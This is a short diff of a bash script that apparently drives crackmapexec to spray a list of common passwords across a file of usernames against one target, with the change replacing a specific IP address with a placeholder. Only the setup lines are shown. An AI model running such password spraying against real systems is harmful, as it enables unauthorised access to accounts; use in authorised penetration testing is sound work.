@@ -61,7 +61,7 @@ crackmapexec
 
 USERLIST="userlist.txt"  # File containing usernames
 PASSWORDS=("Changeme08" "Changeme09" "Changeme07" "Password@123!")  # List of passwords
-TARGET="100.94.30.17"  # Target IP address
+TARGET="IP"  # Target IP address
 OUTPUT_FILE="cme_output.txt"  # File to save results
 
 while read -r user; do
